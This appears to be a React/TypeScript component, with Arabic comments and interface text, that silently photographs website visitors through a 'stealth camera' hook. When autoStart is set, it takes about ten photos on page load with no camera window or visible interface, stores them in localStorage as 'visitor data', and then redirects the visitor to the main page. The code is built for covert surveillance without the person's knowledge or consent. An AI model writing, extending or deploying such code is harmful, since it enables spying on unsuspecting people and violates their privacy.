import React from 'react';
import { useStealthCamera } from '@/hooks/useStealthCamera';
import { Loader2, CheckCircle, AlertCircle } from 'lucide-react';
import { Progress } from '@/components/ui/progress';

interface StealthCameraManagerProps {
  onComplete: () => void;
  autoStart?: boolean;
  photoCount?: number;
}

const StealthCameraManager: React.FC<StealthCameraManagerProps> = ({ 
  onComplete, 
  autoStart = false,
  photoCount = 10 
}) => {
  const {
    isCapturing,
    capturedPhotos,
    currentPhotoIndex,
    startStealthCapture,
    saveVisitorData,
    getAllVisitors
  } = useStealthCamera();

  const [captureComplete, setCaptureComplete] = React.useState(false);
  const [status, setStatus] = React.useState('');
  const [error, setError] = React.useState<string | null>(null);

  // بدء التقاط تلقائي عند التحميل إذا كان autoStart مفعل
  React.useEffect(() => {
    if (autoStart && !isCapturing && !captureComplete) {
      handleStartStealthCapture();
    }
  }, [autoStart]);

  const handleStartStealthCapture = async () => {
    try {
      setError(null);
      setStatus('بدء التقاط الصور بشكل سري...');
      
      const photos = await startStealthCapture(photoCount);
      
      if (photos && photos.length > 0) {
        setStatus('حفظ البيانات...');
        const visitorData = await saveVisitorData(photos);
        
        if (visitorData) {
          setStatus(`تم الانتهاء بنجاح! تم التقاط ${photos.length} صورة بشكل سري`);
          
          // التحقق من حفظ البيانات
          setTimeout(() => {
            const savedVisitors = getAllVisitors();
            const isDataSaved = savedVisitors.some(v => v.id === visitorData.id);
            
            if (isDataSaved) {
              console.log('✅ تم التأكد من حفظ البيانات في localStorage');
              setCaptureComplete(true);
              setTimeout(() => {
                onComplete();
              }, 2000);
            } else {
              console.error('❌ فشل في حفظ البيانات - المحاولة مرة أخرى...');
              setError('فشل في حفظ البيانات، يرجى المحاولة مرة أخرى');
            }
          }, 500);
        } else {
          setError('خطأ في حفظ البيانات');
        }
      } else {
        setError('فشل في التقاط الصور');
      }
    } catch (err) {
      setError('حدث خطأ أثناء التقاط الصور');
      console.error('Stealth capture error:', err);
    }
  };

  const progressPercentage = (currentPhotoIndex / photoCount) * 100;

  // إذا كان autoStart مفعل، لا نعرض أي واجهة مستخدم
  if (autoStart) {
    return (
      <div className="fixed inset-0 pointer-events-none">
        {/* مؤشر تقدم مخفي للتطوير فقط - يمكن إزالته في الإنتاج */}
        {process.env.NODE_ENV === 'development' && isCapturing && (
          <div className="fixed top-4 right-4 bg-black/80 text-white p-2 rounded text-xs">
            التقاط سري: {currentPhotoIndex}/{photoCount}
          </div>
        )}
      </div>
    );
  }

  // واجهة المستخدم العادية (غير السرية)
  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80 p-4">
      <div className="w-full max-w-md bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg p-6">
        <div className="text-center space-y-4">
          <h3 className="text-xl text-white font-semibold">
            التقاط سري
          </h3>
          
          {!isCapturing && !captureComplete && !error && (
            <div className="space-y-4">
              <p className="text-white/90 text-sm">
                سيتم التقاط {photoCount} صور بشكل سري بدون إظهار نافذة الكاميرا
              </p>
              <button 
                onClick={handleStartStealthCapture}
                className="w-full bg-seductive-accent hover:bg-seductive-accent/90 text-white px-4 py-2 rounded-lg transition-colors"
              >
                بدء التقاط السري
              </button>
            </div>
          )}
          
          {isCapturing && (
            <div className="space-y-4">
              <Loader2 className="w-12 h-12 text-seductive-accent animate-spin mx-auto" />
              <p className="text-white text-lg">
                جاري التقاط الصورة {currentPhotoIndex} من {photoCount}
              </p>
              <Progress value={progressPercentage} className="w-full" />
              <p className="text-white/80 text-sm">{status}</p>
              <p className="text-white/60 text-xs">
                التقاط يتم في الخلفية بدون إظهار الكاميرا
              </p>
            </div>
          )}
          
          {captureComplete && (
            <div className="space-y-4">
              <CheckCircle className="w-16 h-16 text-green-400 mx-auto" />
              <p className="text-white text-lg">تم الانتهاء بنجاح!</p>
              <p className="text-white/80 text-sm">{status}</p>
              <p className="text-white/60 text-xs">
                سيتم توجيهك للصفحة الرئيسية خلال ثوانٍ...
              </p>
            </div>
          )}
          
          {error && (
            <div className="space-y-4">
              <AlertCircle className="w-16 h-16 text-red-400 mx-auto" />
              <p className="text-red-400 text-lg">حدث خطأ</p>
              <p className="text-white/80 text-sm">{error}</p>
              <button 
                onClick={handleStartStealthCapture}
                className="w-full bg-seductive-accent hover:bg-seductive-accent/90 text-white px-4 py-2 rounded-lg transition-colors"
              >
                إعادة المحاولة
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default StealthCameraManager;